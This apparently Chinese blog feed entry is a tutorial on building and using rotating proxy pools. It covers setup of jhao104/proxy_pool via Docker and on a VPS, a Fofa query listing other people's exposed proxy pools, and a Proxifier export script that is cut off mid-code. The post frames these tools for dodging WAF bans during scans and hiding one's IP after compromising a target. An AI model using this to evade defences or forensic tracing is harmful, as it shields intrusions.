class="line">----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;异常&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#异常&quot;&gt;&lt;/a&gt; 异常&lt;/h2&gt;
&lt;p&gt;异常的概念：异常是造成程序中断的一种指令流，如果不对异常进行处理则可以导致程序的中断运行，造成不必要的损失，所以在程序设计中必须考虑各种异常的发</summary>
      
    
    
    
    <category term="Java微服务" scheme="https://sun-spots.github.io/categories/java%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/"/>
    <id>https://sun-spots.github.io/2022/03/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/</id>
    <published>2022-03-09T01:03:12.883Z</published>
    <updated>2022-03-09T01:05:52.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代理池技术"><a class="markdownIt-Anchor" href="#代理池技术">#</a> 代理池技术</h1><h1 id="一技术介绍"><a class="markdownIt-Anchor" href="#一技术介绍">#</a> 一：技术介绍</h1><p>代理池应该说已经是比较成熟的技术，而且在飞速发展，比如现在主流的 “秒拨” 技术，给企业在风险 IP 识别和判定上带来极大的难度。代理池技术目前被广泛用于爬虫、灰黑产、SEO、网络攻击、刷单、薅羊毛等等领域。</p><h3 id="11应用场景"><a class="markdownIt-Anchor" href="#11应用场景">#</a> 1.1：应用场景</h3><ol><li>扫描器突然扫到了百分之 5 的时候 我们可能被 WAF 干掉了 这时候可能会想到使用 TOR 代理 可是渗透测试的是国内站点 站点加了审计规则 国外无法访问那么接下来我们就需要一个稳定好用的代理池…</li><li>平时开扫描器或者使用 sqlmap，有的站点使用的 waf 或者防火墙规则会将请求流量过多的 IP ban 掉，而手动切换代理又比较慢，因此需要使用代理池技术来快速切换 IP 地址…</li><li>拿下目标主机进行远程登录时候，害怕自己 IP 地址被记录在案，使用代理池来增加反追踪的难度…</li></ol><h3 id="12代理类型"><a class="markdownIt-Anchor" href="#12代理类型">#</a> 1.2：代理类型</h3><p><strong>》》》按照安全程度《《《</strong></p><table><thead><tr><th>代理类型</th><th>安全程度</th><th>区别</th></tr></thead><tbody><tr><td>透明代理</td><td>4</td><td>透明代理虽然可以直接 “隐藏” 客户端的 IP 地址，但是还是可以从 HTTP_X_FORWARDED_FOR 来查到客户端的 IP 地址</td></tr><tr><td>匿名代理</td><td>3</td><td>匿名代理能提供隐藏客户端 IP 地址的功能。使用匿名代理，服务器能知道客户端使用了代理，但无法知道客户端真实 IP 地址。</td></tr><tr><td>混淆代理</td><td>2</td><td>与匿名代理的原理相似，但是会伪装得更逼真。如果客户端使用了混淆代理，服务器还是能知道客户端在使用代理，但是会得到一个假的客户端 IP 地址。</td></tr><tr><td>高匿代理</td><td>1</td><td>高匿代理既能让服务器不清楚客户端是否在使用代理，也能保证服务器获取不到客户端的真实 IP 地址。</td></tr></tbody></table><p>代理类型主要取决于代理服务器端的配置，不同配置会形成不同的代理类型。在配置中，有三个变量是决定性因素：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>REMOTE_ADDR：REMOTE_ADDR 表示客户端的 IP，但是它的值不是由客户端提供的，而是服务器根据客户端的 IP 指定的。如果使用浏览器直接访问某个网站，那么网站的 web 服务器（Nginx、Apache等）就会把 REMOTE_ADDR 设为客户端的 IP 地址。我们给浏览器设置代理，我们访问目标网站的请求会先经过代理服务器，然后由代理服务器将请求转化到目标网站。那么网站的 web 服务器就会把 REMOTE_ADDR 设为代理服务器的 IP。</span><br><span class="line"><span class="number">2.</span>X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">For</span>（XFF）:X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">For</span> 是一个 HTTP 扩展头部，用来表示 HTTP 请求端真实 IP。当客户端使用了代理时，web 服务器就不知道客户端的真实 IP 地址。为了避免这个情况，代理服务器通常会增加一个 X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">For</span> 的头信息，把客户端的 IP 添加到头信息里面。如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">For</span>:IP0,IP1,IP2</span><br><span class="line"><span class="number">3.</span>HTTP_VIA: via 是 HTTP 协议里面的一个header,记录了一次 HTTP 请求所经过的代理和网关，经过<span class="number">1</span>个代理服务器，就添加一个代理服务器的信息，经过<span class="number">2</span>个就添加<span class="number">2</span>个。</span><br></pre></td></tr></table></figure><p>代理服务器配置不同:…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>透明代理(Transparent Proxy)：</span><br><span class="line">REMOTR_ADDR <span class="operator">=</span> Proxy IP</span><br><span class="line">HTTP_VIA <span class="operator">=</span> Proxy IP</span><br><span class="line">HTTP_X_FORWORDED_FOR <span class="operator">=</span> Your IP</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>匿名代理(Anonymous Proxy)：</span><br><span class="line">REMOTR_ADDR <span class="operator">=</span> Proxy IP</span><br><span class="line">HTTP_VIA <span class="operator">=</span> Proxy IP</span><br><span class="line">HTTP_X_FORWORDED_FOR <span class="operator">=</span> Proxy IP</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>混淆代理(Distorting Proxy)：</span><br><span class="line">REMOTR_ADDR <span class="operator">=</span> Proxy IP</span><br><span class="line">HTTP_VIA <span class="operator">=</span> Proxy IP</span><br><span class="line">HTTP_X_FORWORDED_FOR <span class="operator">=</span> Random IP</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>REMOTR_ADDR <span class="operator">=</span> Proxy IP</span><br><span class="line">HTTP_VIA <span class="operator">=</span> <span class="keyword">not</span> determined</span><br><span class="line">HTTP_X_FORWORDED_FOR <span class="operator">=</span> <span class="keyword">not</span> determined</span><br></pre></td></tr></table></figure><p>代理检测地址：</p><ul><li><span class="exturl" data-url="aHR0cDovL2guamlndWFuZ2RhaWxpLmNvbS9jaGVjay8=">http://h.jiguangdaili.com/check/</span></li></ul><p><strong>》》》按存活时间《《《</strong></p><table><thead><tr><th>代理类型</th><th>优点</th><th>缺点</th><th>推荐使用</th></tr></thead><tbody><tr><td>动态代理</td><td>价格便宜 速度快 稳定</td><td>不能进行漏洞扫描行为</td><td>ProxyPool</td></tr><tr><td>静态代理</td><td>可以进行漏洞扫描行为 速度快 稳定 单个 ip 可以使用五分钟</td><td>贵！！！</td><td>熊猫代理</td></tr></tbody></table><h3 id="13代理池项目"><a class="markdownIt-Anchor" href="#13代理池项目">#</a> 1.3：代理池项目</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>jhao104<span class="operator">/</span>proxy_pool</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>iamhmx<span class="operator">/</span>MXProxyPool<span class="operator">/</span></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>SpiderClub<span class="operator">/</span>haipproxy</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>liuslnlp<span class="operator">/</span>ProxyPool</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>awolfly9<span class="operator">/</span>IPProxyTool</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>GuoBoy<span class="operator">/</span>ArrowProxy</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><strong>代理池项目介绍参考：</strong></p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zdXlpbi1ibG9nLmNsdWIvMjAyMS8yRzRIWEJZLw==">https://suyin-blog.club/2021/2G4HXBY/</span></li></ul><h1 id="二代理池搭建"><a class="markdownIt-Anchor" href="#二代理池搭建">#</a> 二：代理池搭建</h1><p>》》》友情说明《《《</p><p>如果不想搭建，可以使用以下 Fofa 语法来搜索已经搭建好的代理池…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body=<span class="string">&quot;get all proxy from proxy pool&quot;</span></span><br><span class="line"><span class="comment">###部分地址###</span></span><br><span class="line">http://<span class="number">47.98</span><span class="number">.182</span><span class="number">.226</span>:<span class="number">8081</span>/<span class="built_in">all</span>/</span><br><span class="line">http://<span class="number">139.198</span><span class="number">.109</span><span class="number">.247</span>/<span class="built_in">all</span>/</span><br><span class="line">http://<span class="number">47.98</span><span class="number">.59</span><span class="number">.88</span>/get_all/</span><br></pre></td></tr></table></figure><h3 id="21docker环境"><a class="markdownIt-Anchor" href="#21docker环境">#</a> 2.1：Docker 环境</h3><p><strong>》》》搭建步骤《《《</strong></p><p>步骤一：安装 Docker 并启动…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">###安装必要的系统工具</span><br><span class="line">yum install <span class="operator">-</span>y yum<span class="operator">-</span>utils device<span class="operator">-</span>mapper<span class="operator">-</span>persistent<span class="operator">-</span>data lvm2</span><br><span class="line">###添加软件源信息</span><br><span class="line">yum<span class="operator">-</span>config<span class="operator">-</span>manager <span class="comment">--add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span></span><br><span class="line">###更新yum缓存</span><br><span class="line">yum makecache fast</span><br><span class="line">###安装Docker<span class="operator">-</span>ce</span><br><span class="line">yum <span class="operator">-</span>y install docker<span class="operator">-</span>ce</span><br><span class="line">###启动Docker服务</span><br><span class="line">systemctl <span class="keyword">start</span> docker</span><br><span class="line">###测试运行</span><br><span class="line">docker run hello<span class="operator">-</span>world</span><br></pre></td></tr></table></figure><p>步骤二：拉取镜像并启动容器…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull jhao104<span class="operator">/</span>proxy_pool</span><br><span class="line">docker pull redis</span><br><span class="line">#依赖redis, 所以要先安装 redis</span><br><span class="line">docker run <span class="operator">-</span>d <span class="comment">--name redis -p 6379:6379 redis:latest  --requirepass &quot;123456&quot;</span></span><br><span class="line">docker run <span class="comment">--env DB_CONN=redis://:123456@172.17.0.1:6379/1 -p 5010:5010 --name proxy_pool jhao104/proxy_pool:latest</span></span><br></pre></td></tr></table></figure><p>步骤三：Docker 启动后，通过访问本地接口得到 IP 地址…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5010</span><span class="operator">/</span><span class="keyword">get</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>laosec.cn:<span class="number">5010</span><span class="operator">/</span></span><br></pre></td></tr></table></figure><p><strong>注意：应该提前在 VPS 开启对应的端口…</strong></p><h3 id="22vps环境"><a class="markdownIt-Anchor" href="#22vps环境">#</a> 2.2：VPS 环境</h3><p><strong>》》》环境介绍《《《</strong></p><p>基础环境：</p><p>Java JDK 1.8.0</p><p>Python 3.6~3.7</p><p>Redis-server 3.2</p><p>搭建位置：阿里云 VPS Centos 7</p><p><strong>》》》搭建步骤《《《</strong></p><p>步骤一：登录 VPS 并创建对应目录来存放项目文件… 下载并解压进入目录后再安装依赖文件…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">###下载代码</span><br><span class="line">git clone git<span class="variable">@github</span>.com:jhao104<span class="operator">/</span>proxy_pool.git</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>jhao104<span class="operator">/</span>proxy_pool<span class="operator">/</span>releases 下载对应zip文件</span><br><span class="line">unzip ProxyPool_2<span class="number">.3</span><span class="number">.0</span>.zip</span><br><span class="line">mv ProxyPool_2<span class="number">.3</span><span class="number">.0</span> proxypool</span><br><span class="line">cd proxypool</span><br><span class="line">###安装依赖</span><br><span class="line">pip install <span class="operator">-</span>r requirements.txt</span><br></pre></td></tr></table></figure><p>步骤二：更新配置文件…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># setting.py 为项目配置文件</span><br><span class="line">VERSION <span class="operator">=</span> &quot;2.3.0&quot;</span><br><span class="line"></span><br><span class="line"># ############### server config ###############</span><br><span class="line">HOST <span class="operator">=</span> &quot;0.0.0.0&quot;   # IP</span><br><span class="line">PORT <span class="operator">=</span> <span class="number">5010</span>        # 监听端口</span><br><span class="line"></span><br><span class="line"># ############### database config ###################</span><br><span class="line"># db connection uri</span><br><span class="line"># example:</span><br><span class="line">#      Redis: redis:<span class="operator">/</span><span class="operator">/</span>:password<span class="variable">@ip</span>:port<span class="operator">/</span>db</span><br><span class="line">#      Ssdb:  ssdb:<span class="operator">/</span><span class="operator">/</span>:password<span class="variable">@ip</span>:port</span><br><span class="line">DB_CONN <span class="operator">=</span> <span class="string">&#x27;redis://:root@127.0.0.1:6379/0&#x27;</span></span><br><span class="line"></span><br><span class="line"># proxy <span class="keyword">table</span> name</span><br><span class="line">TABLE_NAME <span class="operator">=</span> <span class="string">&#x27;use_proxy&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ###### config the proxy <span class="keyword">fetch</span> <span class="keyword">function</span> ######</span><br><span class="line">PROXY_FETCHER <span class="operator">=</span> [</span><br><span class="line">    &quot;freeProxy01&quot;,    # 这里是启用的代理抓取方法名，所有<span class="keyword">fetch</span>方法位于fetcher<span class="operator">/</span>proxyFetcher.py</span><br><span class="line">    &quot;freeProxy02&quot;,</span><br><span class="line">    #......</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>步骤三：安装运行 redis 服务并设置密码信息…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">###安装启动Redis</span><br><span class="line">yum <span class="operator">-</span>y install redis</span><br><span class="line">systemctl <span class="keyword">start</span> redis</span><br><span class="line">###设置连接密码</span><br><span class="line">[root<span class="variable">@localhost</span>]#redis<span class="operator">-</span>cli      #进入Redis服务器</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span><span class="operator">&gt;</span>auth <span class="number">123456</span>      #查看是否设置了密码 报错说明没有设置密码</span><br><span class="line">(error) ERR Client sent AUTH, but <span class="keyword">no</span> password <span class="keyword">is</span> <span class="keyword">set</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span><span class="operator">&gt;</span>config <span class="keyword">set</span> requirepass root   #设置密码为root</span><br><span class="line">Ok</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span><span class="operator">&gt;</span>AUTH root                     #验证密码</span><br><span class="line">Ok</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span><span class="operator">&gt;</span>keys <span class="operator">*</span>                        #查看数据库</span><br><span class="line"><span class="number">1</span>) &quot;use_proxy&quot;</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span><span class="operator">&gt;</span> HGETALL use_proxy            #查看数据库数据</span><br><span class="line">.....</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span><span class="operator">&gt;</span> exit</span><br></pre></td></tr></table></figure><p>** 注意：**<strong> 这种配置方式存在一个很严重的问题，就是当我们将 Redis 服务器关掉之后，这些配置就会失效，下次再启动服务器，需要重新设置！</strong></p><p>步骤四：启动代理池服务并开始验证…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 如果已经具备运行条件, 可用通过proxyPool.py启动。</span><br><span class="line"># 程序分为: schedule 调度程序 和 server Api服务</span><br><span class="line"></span><br><span class="line"># 启动调度程序</span><br><span class="line">python3 proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># 启动webApi服务</span><br><span class="line">python3 proxyPool.py server</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631422342592-f7a3b025-189d-4863-ad49-a14ce97095e9.png" alt="img"></p><p>步骤五：服务器下载以下项目并执行命令开启代理…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">###下载项目</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>safe6Sec<span class="operator">/</span>proxyServer<span class="operator">/</span>tree<span class="operator">/</span>v1<span class="number">.1</span>   #下载需要依赖IP地址池的...</span><br><span class="line">###运行项目</span><br><span class="line">java <span class="operator">-</span>jar proxyServer.jar <span class="number">6666</span>   </span><br></pre></td></tr></table></figure><p>步骤六：浏览器设置好代理并进行 IP 地址验证…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>myip.ipip.net<span class="operator">/</span>   #请求IP地址获取</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631422583057-24daba04-18f3-4971-96e2-19fabff7b109.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631422609259-4a3c0b8e-7f4d-4ab2-8ebc-618aa62a8a6f.png" alt="img"><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631422661808-a3469d8d-81d9-47e4-8c97-1a5bfac708ed.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631422683364-b8bde36b-112c-42a4-9654-178fe7579e55.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631422762285-32a35f54-2732-4fca-90e1-76ea09d6b453.png" alt="img"></p><h1 id="三代理池应用"><a class="markdownIt-Anchor" href="#三代理池应用">#</a> 三：代理池应用</h1><h3 id="31proxifier"><a class="markdownIt-Anchor" href="#31proxifier">#</a> 3.1：Proxifier</h3><p>思路：通过脚本获取 ProxyPool 服务器的代理信息并导出至 Proxifier 的配置文件加载进去并开始扫描软件代理…</p><p>缺点：代理信息需要实时获取才能够保证质量</p><p>优点：…</p><p>步骤一：启动 ProxyPool 服务并访问验证… 需要注意不能够开启 Redis 服务认证，原因：脚本不支持…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631431239119-dd75ee85-d295-4284-8e31-10a69228b023.png" alt="img"></p><p>步骤二：将一下脚本修改并上传到服务器执行，获取 Proxifier 配置文件下载到本地</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631431305219-7a6101bf-d526-4dd6-811b-569826260600.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"># <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span> coding:utf8 <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span></span><br><span class="line">import redis</span><br><span class="line">import json</span><br><span class="line"><span class="keyword">from</span> xml.etree import ElementTree</span><br><span class="line"></span><br><span class="line">def RedisProxyGet():</span><br><span class="line">    ConnectString <span class="operator">=</span> []</span><br><span class="line">    pool <span class="operator">=</span> redis.ConnectionPool(host<span class="operator">=</span><span class="string">&#x27;192.168.10.20&#x27;</span>, port<span class="operator">=</span><span class="number">6379</span>, db<span class="operator">=</span><span class="number">0</span>, decode_responses<span class="operator">=</span><span class="literal">True</span>)</span><br><span class="line">    use_proxy <span class="operator">=</span> redis.Redis(connection_pool<span class="operator">=</span>pool)</span><br><span class="line">    key <span class="operator">=</span> use_proxy.hkeys(<span class="string">&#x27;use_proxy&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> key:</span><br><span class="line">        try:</span><br><span class="line">            ConnectString.append(json.loads(use_proxy.hget(<span class="string">&#x27;use_proxy&#x27;</span>,temp)))</span><br><span class="line">        <span class="keyword">except</span> json.JSONDecodeError: # JSON解析异常处理</span><br><span class="line">            pass</span><br><span class="line">    <span class="keyword">return</span> ConnectString</span><br><span class="line"></span><br><span class="line">def xmlOutputs(data):</span><br><span class="line">    i <span class="operator">=</span> <span class="number">101</span></span><br><span class="line">    ProxyIDList <span class="operator">=</span> []</span><br><span class="line"># ProxifierProfile根</span><br><span class="line">    ProxifierProfile <span class="operator">=</span> ElementTree.<span class="built_in">Element</span>(&quot;ProxifierProfile&quot;)</span><br><span class="line">    ProxifierProfile.set(&quot;version&quot;, str(i))</span><br><span class="line">    ProxifierProfile.set(&quot;platform&quot;, &quot;Windows&quot;)</span><br><span class="line">    ProxifierProfile.set(&quot;product_id&quot;, &quot;0&quot;)</span><br><span class="line">    ProxifierProfile.set(&quot;product_minver&quot;, &quot;310&quot;)</span><br><span class="line"></span><br><span class="line"># Options 节点</span><br><span class="line">    Options <span class="operator">=</span> ElementTree.SubElement(ProxifierProfile, &quot;Options&quot;)</span><br><span class="line"></span><br><span class="line">    # Options.Resolve</span><br><span class="line">    Resolve <span class="operator">=</span> ElementTree.SubElement(Options, &quot;Resolve&quot;)</span><br><span class="line">    # Options.Resolve.AutoModeDetection</span><br><span class="line">    AutoModeDetection <span class="operator">=</span> ElementTree.SubElement(Resolve, &quot;AutoModeDetection&quot;)</span><br><span class="line">    AutoModeDetection.set(&quot;enabled&quot;, &quot;false&quot;)</span><br><span class="line"></span><br><span class="line">    # Options.Resolve.ViaProxy</span><br><span class="line">    ViaProxy <span class="operator">=</span> ElementTree.SubElement(Resolve, &quot;ViaProxy&quot;)</span><br><span class="line">    ViaProxy.set(&quot;enabled&quot;, &quot;false&quot;)</span><br><span class="line"></span><br><span class="line">    # Options.Resolve.ViaProxy.TryLocalDnsFirst</span><br><span class="line">    TryLocalDnsFirst <span class="operator">=</span> ElementTree.SubElement(ViaProxy, &quot;TryLocalDnsFirst&quot;)</span><br><span class="line">    TryLocalDnsFirst.set(&quot;enabled&quot;, &quot;false&quot;)</span><br><span class="line"></span><br><span class="line">    # Options.Resolve.ExclusionList</span><br><span class="line">    ExclusionList <span class="operator">=</span> ElementTree.SubElement(Resolve, &quot;ExclusionList&quot;)</span><br><span class="line">    ExclusionList.text <span class="operator">=</span> &quot;%ComputerName%; localhost; *.local&quot;</span><br><span class="line"></span><br><span class="line">    # Options.<span class="operator">*</span></span><br><span class="line">    Encryption <span class="operator">=</span> ElementTree.SubElement(Options, &quot;Encryption&quot;)</span><br><span class="line">    Encryption.set(&quot;mode&quot;, <span class="string">&#x27;basic&#x27;</span>)</span><br><span class="line">    Encryption <span class="operator">=</span> ElementTree.SubElement(Options, &quot;HttpProxiesSupport&quot;)</span><br><span class="line">    Encryption.set(&quot;enabled&quot;, <span class="string">&#x27;true&#x27;</span>)</span><br><span class="line">    Encryption <span class="operator">=</span> ElementTree.SubElement(Options, &quot;HandleDirectConnections&quot;)</span><br><span class="line">    Encryption.set(&quot;enabled&quot;, <span class="string">&#x27;false&#x27;</span>)</span><br><span class="line">    Encryption <span class="operator">=</span> ElementTree.SubElement(Options, &quot;ConnectionLoopDetection&quot;)</span><br><span class="line">    Encryption.set(&quot;enabled&quot;, <span class="string">&#x27;true&#x27;</span>)</span><br><span class="line">    Encryption <span class="operator">=</span> ElementTree.SubElement(Options, &quot;ProcessServices&quot;)</span><br><span class="line">    Encryption.set(&quot;enabled&quot;, <span 